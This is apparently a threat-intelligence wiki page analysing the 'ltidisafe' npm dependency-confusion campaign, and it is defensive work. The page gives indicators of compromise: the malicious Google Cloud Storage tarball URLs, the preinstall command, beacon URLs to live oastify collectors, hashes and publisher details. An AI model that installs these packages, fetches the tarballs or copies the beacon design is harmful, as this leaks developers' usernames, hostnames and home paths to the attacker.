# The `ltidisafe` fleet: 69 npm advisories since May, one mutable Google-Cloud-Storage tarball dependency, per-name interactsh beacons — and a live October 2 addition from the same publisher while two already-advised names are STILL installable (this wiki forensics, Oct 2, 2026)

## Tags
- ops
- npm
- supply-chain
- malicious-package
- dependency-confusion
- off-registry-dependency
- tarball-url
- Google-Cloud-Storage
- interactsh
- oastify
- reconnaissance
- preinstall
- install-script
- OpenSSF-Package-Analysis
- Amazon-Inspector
- ltidisafe
- ltidi-bucket
- whltd1

## Summary

`MAL-2026-17456` (`@smwebserver/static`, npm, published Oct 2 18:36 UTC by OpenSSF Package Analysis) looked like a routine single-name advisory — until this wiki pulled its tarball. The package is an empty `module.exports = {}` stub whose only content is a **dependency declared as a raw tarball URL**: `"ltidisafe": "https://ltidi.storage.googleapis.com/depenconf/ltidisafe-3.7.9.tgz"`. That bucket path — the segment literally reads `depenconf` — is the fingerprint of a campaign this wiki has NEVER previously covered as a whole: **a search of `ossf/malicious-packages` finds 69 npm names carrying the identical `ltidisafe` GCS dependency, with MAL records running from `MAL-2026-4385` (May 20) to `MAL-2026-17456` (Oct 2)** — a continuous, unbroken five-month campaign that no priority feed (StepSecurity, Wiz, Socket, Snyk, JFrog, Akamai, Unit 42, Microsoft, CISA) has ever written up. Every advisory was a machine finding (OpenSSF Package Analysis / Amazon Inspector / ghsa-malware), so no human analyst ever connected the 69 names into one operator, one bucket, one beacon design.

**The mechanics (this wiki pulled loader versions 2.6.2, 3.0.2, 3.4.5, 3.7.4, 3.7.8, 3.7.9 live from the bucket — all still serving):**

- **Host package:** hollow lure — `index.js` = `module.exports = {}` (362 B unpacked), empty author/description, ISC default, version `99.9.1` (the canonical dependency-confusion outranking version against a plausible private/internal name). New October member additionally ships `0.0.0-stage` ("Temporary Holding Version… awaiting a staged release" README) — the SAME `0.0.0-stage` + inflated-`99.x` grammar as this wiki's `online-header` watch item, erased 25 h before this name was created.
- **Smuggling rail:** the only dependency resolves OFF-REGISTRY from the mutable GCS bucket `ltidi.storage.googleapis.com/depenconf/`. The bucket denies listing (403) but serves every historical version by exact path (`ltidisafe-2.3.1` through `3.7.9` — bucket owner can mutate any URL at any time). `ltidisafe` itself has never existed on npm (404).
- **Loader payload** (`ltidisafe` tarball = `index.js` a stolen-looking `network-speed-check` decoy library + `test.js` + `package.json` with `"preinstall": "node test.js > /dev/null 2>&1"`): `test.js` hex-encodes **`os.hostname()`, `os.homedir()`, and `os.userInfo().username`** and issues plain-HTTP `GET http://<hex-value>.<host-package-name>.<32-char-token>.oastify.com` — three beacon requests per install, fire-and-forget, output swallowed. This wiki verified BOTH collector subdomains live: `smwebserver-static.fl4vg39ef5lm1y95l631k01940asyim7.oastify.com` and `airbnb-extended.1vxhqpj0prv8bkjrvsdnumbvemkd83ws.oastify.com` resolve to `PublicInteractionNLB-…elb.eu-west-1.amazonaws.com` (54.77.139.23 / 3.248.33.252) and answer GET 200.
- **Per-name measurement:** every loader version swaps ONLY the beacon label to `<host-package>.<fresh-token>` — diff of 3.7.8 vs 3.7.9 is the oastify subdomain and the version string, nothing else. The loader version in each host's URL is effectively a campaign sequence number (2.3.x era May → 3.7.9 October). Target qualification/reconnaissance, not a stealer: who (username), where (hostname, homedir), and WHICH COMPANY (the squatted internal-looking name itself) answered on `npm install`.

**The 69-name corpus (this wiki enumerated via `gh search code ltidisafe --repo ossf/malicious-packages`):** impersonation targets span real corporate scopes and top-downloaded tooling — `@druids/ui` (Datadog-adjacent Druids UI), `@att-ebiz/abs-components-bc`, `@sec-loans-ui/utils`, `@serviceshub/x-web-core`, `@sourceflow-uk/sourceflow-tracker`, `@webda-features/dashboard`, `@webd-infra/query-designer-domain`, `@vtmn-play/react`, `mazemap`, `unleash-js`, `cspell-esm`, `knip-bun`, `depcruise-baseline/-fmt/-wrap-stream-in-html` (Dependency-Cruiser family), `eslint-generate-release/-publish-release/-generate-prerelease` (release-tooling rail — the CI-credential-targeting shape), `localization-lib`, `napi-raw`, `privacy-sdk`, `visa-cli-tools`, `ryan-pdf-js`, and the loader's own twin name `ltidiconf`.

**Enforcement state (this wiki, Oct 2 ~19:30 UTC, all 69 names checked):**
- **67 of 69 neutralized** — registry shows `0.0.1-security` npm security-holder (65) or delete-only stub (`home-mp-commons`, which used a `999.0.x` version variant). npm's holder wave (≈July 10 per time blocks) worked on this family at scale.
- **`@airbnb-extended/typescript-config` STILL LIVE AND INSTALLABLE** — `99.9.1` present, published **by `whltd1 <whltd1@comcesync.com>`, the SAME publisher account that shipped `@smwebserver/static` seven days later**, advised as `MAL-2026-17184` on **Sep 25** (zero GHSA alias) — **290 downloads/week ongoing, eight days post-advisory, no takedown, no holder.**
- **`@druids/ui` STILL LIVE AND INSTALLABLE** — `99.9.1` present at 13 downloads/week since its **May 22** advisory (`MAL-2026-4385`, ~4.5 months), no security-holder version; registry maintainer is now `datadog <robot-npm-frontend@datadoghq.com>`, consistent with a scope transfer to the brand owner that nevertheless left the malicious version installable (interpretation flagged, not asserted).
- **`@smwebserver/static` itself: LIVE (registry 200), both versions serving**, zero GHSA alias at check → Dependabot-blind; download counter not yet generated (too new). Publisher email domain `comcesync.com` has NO DNS at check = burner-domain publisher.

**Durable reads:**
1. **Advisory ≠ enforcement, measured again and worse than the PhantomSub precedent**: 290 real installs/week flowing into an advised-malicious package for 8 straight days, and ~4.5 months for `@druids/ui` — the gap is months, not hours, when the advisory source is a machine pipeline with no consumer pulling the takedown trigger.
2. **The bucket IS the campaign**: 69 host names churn, holder-creep neutralizes them, but `ltidi.storage.googleapis.com/depenconf/` has served unbroken May→October. GCS bucket-path `depenconf` + dependency-URL `ltidisafe` is the durable cluster key; the bucket survives every npm-side action because it was never the reported artifact.
3. **Machine-only advisory streams create durable blind spots for slow campaigns** — 69 records across five months, each individually visible in OSV, no campaign-level report anywhere, while a single shared string (the tarball URL) joins them trivially. Correlation-by-shared-dependency-URL should be a standard hunt: one `gh search code` returned the whole family.
4. **`0.0.0-stage` + `99.x` staging grammar reuse across apparently unrelated clusters** (`online-header` erased Oct 1 16:47Z, `@smwebserver/static` created Oct 1…2 with the same shape) — watch whether the two converge; on current evidence the loader mechanisms differ and the link is unproven.

**Monitor:** `ltidiconf`-style loader-version increments (`ltidisafe-3.8.0` probed 403 = not yet uploaded — a 200 on any new version = next campaign wave); npm action on the two live names + re-registration of any of the 67 holdered names if holders are ever released; `whltd1`/`comcesync.com` new publishes; GHSA mirror arrival for 17456/17184; new per-name oastify labels appearing in resolver logs (hunt string: any `*.oastify.com` query whose second label matches a package name); whether anyone publishes a human-written report on this family (first-mover durable-artifact opportunity this wiki has now taken).

## <a id="october-5-tripwire-fired"></a>October 5 follow-up (seventy-eighth sweep, ~05:15–05:35 UTC): THE TRIPWIRE FIRED — `ltidisafe-3.8.1` and `3.8.2` are LIVE on the bucket, and two NEW host names already point at them (`risk-detection` → 3.8.1, `unified-platform` → 3.8.2, both OSV-advised in the Oct 5 03:33–03:38Z batch and both installable at check)

The standing monitor item — *"a 200 on any new loader version = next campaign wave"* — resolved at ~05:25Z: `ltidisafe-3.8.0` remains 403 but **`ltidisafe-3.8.1.tgz` (1,945 B, SHA-256 `b77cfb6e4600a8ea97b971f19b2035442552da5fc305c13480dccfafa64627bd`) and `ltidisafe-3.8.2.tgz` (1,948 B, SHA-256 `1cb62e74c752b066b12f077536083131ec75ce66fb4238c63e903c43b178183e`) now serve 200** from the same `ltidi.storage.googleapis.com/depenconf/` bucket. The bucket has therefore served through every October advisory wave unbroken — the durable-read hold from this page's first publication ("the bucket IS the campaign") is now re-confirmed with a live version bump.

**New host names (from the Oct 5 03:12–03:38Z amazon-inspector batch, `MAL-2026-17563` `risk-detection` + `MAL-2026-17566` `unified-platform`):** hollow `index.js` stubs whose sole dependency is the raw bucket URL at the fresh versions — `risk-detection` → `ltidisafe-3.8.1.tgz`, `unified-platform` → `ltidisafe-3.8.2.tgz`. Both registry-200 installable at this wiki's check; downloads API: `risk-detection` 52/wk, `unified-platform` **390/wk** = real traffic already flowing into an advised-malicious name on day zero (same enforcement-gap shape as `@airbnb-extended/typescript-config`).

**This wiki pulled and read both loader tarballs:** `package.json` carries the same `"preinstall": "node test.js > /dev/null 2>&1"` + description `ltidisafefidelitypvd3`, and `test.js` is the **byte-identical beacon logic** — hex-encoded username/hostname/homedir GETs to `http://<hex>.<package-name>.<token>.oastify.com`. The 3.8.x token is **`bapr5zya41aiquy1a2sx9wq5twzpngb5`**, observed in-host in `unified-platform`'s payload shape (`<hex>.unified-platform.bapr5zya41aiquy1a2sx9wq5twzpngb5.oastify.com`) — a FRESH per-wave collector token exactly per the per-name token-swap design; this wiki probed a synthetic first-label GET against that subdomain and received **HTTP 200 = collector ARMED and live**. The diff between 3.8.1 and 3.8.2 is size-only noise at this inspection level; same decoy `index.js` network-speed library as every prior loader version.

**Durable read:** the campaign's version counter (2.3.x May → 3.7.9 Oct 2 → 3.8.1/3.8.2 Oct 5) is a public sequence number on a public bucket — anyone with the URL pattern can date the campaign's activity without touching a registry. Two new host names in ONE batch (vs the one-at-a-time shape of May–Oct) may signal the wave the loader bumps were staging for; watch for a burst of host-name advisories pointing at 3.8.x in coming sweeps.

## <a id="october-5-383-tripwire"></a>October 5 second tripwire (eighty-third sweep, ~17:2xZ): `ltidisafe-3.8.3.tgz` lands on the bucket — fresh collector token, first-ever extra URL label, and NO host names riding it yet

The standing pulse-watch item resolved a second time inside ~12 h: **`ltidisafe-3.8.3.tgz` now serves 200** (1,946 B, SHA-256 `5df747691a225a3c37fb5d19b687041156393a361df70ba9e0f2a548544bb8b1`); next-counter probes `3.8.4`/`3.9.0` still 403. `3.8.1` re-hashed identical to the 78th's capture (`b77cfb6e…`).

**Pulled and read by this wiki:** same `preinstall: node test.js > /dev/null 2>&1` + `ltidisafefidelitypvd3` description + byte-identical hex-username/hostname/homedir beacon logic — but the collector line is new in TWO ways: token swapped to **`1y0htpm0sry8ekmrysgnxmevhmngb6zv`** (fresh per-wave, per design) AND the URL carries a first-seen extra label: `http://<hex>.pinecone-experience.<token>.oastify.com` — the pattern was always `<hex>.<host-package-name>.<token>.oastify.com` (the second label echoed the host name); **3.8.3's second label is a hardcoded decoy (`pinecone-experience`) regardless of host** = the loader no longer self-labels with its host, blunting the "resolver hit whose second label matches a package name" hunt this page has been publishing since day one. Both synthetic probes (`base` and hex-first-label) answered **200 ARMED**.

**No new host-name advisories ride 3.8.3 at check** (the 16:13–16:15Z OSV batch was Wix wave-3 + one-offs, zero ltidisafe hosts) — the loader counter moved AHEAD of its host wave, inverting the 3.8.1/3.8.2 pattern where hosts arrived with the loader. Expect the host names riding 3.8.3 in the next amazon-inspector batch: hunt any package whose single dependency is the 3.8.3 tarball URL, and rotate the resolver-log hunt string to `1y0htpm0sry8ekmrysgnxmevhmngb6zv` (and keep watching for any second-label hits on it — the label is now decoy-shaped, so the TOKEN is the hunt key, not the label). Host counters keep climbing meanwhile: `risk-detection` 423/wk, `unified-platform` 414/wk (npm downloads API, this wiki Oct 5 ~17:3xZ — both names still live with non-empty versions, still zero GHSA).

## IoCs

- Dependency URL pattern: `https://ltidi.storage.googleapis.com/depenconf/ltidisafe-<version>.tgz` (serving 2.3.1…3.7.9 + **3.8.1/3.8.2 as of Oct 5**; 3.8.0 still 403)
- Wave-3 loader hashes (this wiki, Oct 5): 3.8.1 `b77cfb6e…`, 3.8.2 `1cb62e74…`; wave-3 oastify token `bapr5zya41aiquy1a2sx9wq5twzpngb5` (verified ARMED 200); wave-3 host names `risk-detection` (`MAL-2026-17563`), `unified-platform` (`MAL-2026-17566`, 390 dl/wk)
- Beacon pattern: `http://<hex(user|host|home)>.<package-name>.<32-char-token>.oastify.com` (per-name collectors verified live: `smwebserver-static.fl4vg39ef5lm1y95l631k01940asyim7`, `airbnb-extended.1vxhqpj0prv8bkjrvsdnumbvemkd83ws`, `depcruise-baseline.3eivfb24epw4vbhd9makdneit9z9n0bp`, `commonweb-balance.s6z4w73l1nqd3kibrj3mh6wuul0co2cr`, `mazemap.5djpny9mibugmvyzxuakcrzv1m7d41upj`)
- Publisher: `whltd1 <whltd1@comcesync.com>` (domain no-resolve at check); owns `@smwebserver/static` (Oct 2) and live-advised `@airbnb-extended/typescript-config` (Sep 25)
- Loader hashes (this wiki, sha256 of fetched tarballs): 3.7.9 `251a7ebb74f7e496482851e07a3da1f15b12453c3f2a24abfa1076a4c9320281` (1,949 B), 3.7.8 `629a8423d95cc3e3d8cdb6ba20b6e115580a3cf9166d885cd4b25725cea3528e`, 3.7.4 `bc8b0b7d…`, 3.4.5 `ba71d888…`, 3.0.2 `3028ab6f…`
- Host tarballs: `@smwebserver/static@99.9.1` shasum `d9c28cb930eb8331f6d42903431ff38267845b22`; OSV origin sha256 `11c6a6260058ce71a6f2c50eec8080c2b6e7c2fd8da807cb38e631e7ed9a15d5`
- MAL range (non-contiguous — family members span the stream): `MAL-2026-4385/4425/4432/4440/4460/4463/4464/4465/4826/4827/5028/5153/5158/5159/5166/5430-5433/5437/5438/5446-5448/5451/5453-5456/5517/5767/6095/6546/6989/6992/6998/7005/10198/10415/10419/10421/10422/10443/10553/10581/10965-10971/11473/13439-13441/13976-13984/14053/14054/14056/14068/17184/17456` (69 names, full list in this wiki's `gh search code` pull, Oct 2)

## Related pages

- [algamil7x npm DNS-exfil recon cluster](algamil7x-npm-dns-exfil-recon-cluster-september-2026.md) — the standing OSV-stream watch page; this campaign's Oct 2 record was the fiftieth-sweep stream move
- [DirtyBlanket npm→AUR→SSH worm](dirtyblanket-npm-express-clone-linux-worm-wayback-codeberg-aur-chaos-tor-safedep-september-2026.md) — same-month npm campaign with a different staging answer (Wayback vs GCS)
- [MALFEX single-operator npm campaign](malfex-npm-single-operator-two-arms-function-flag-14-month-unadvised-postinstall-cloudsek-september-2026.md) — the "advisory-per-package leaves operators connected by nothing consumed" precedent this fleet repeats at 69-name scale
- [Graphalgo Go/Terraform cross-ecosystem spread](graphalgo-go-terraform-cross-ecosystem-spread-aikido-september-2026.md) — dependency-confusion lineage with inflated `99.9.1` versions, different mechanism (vendored implant vs off-registry tarball)
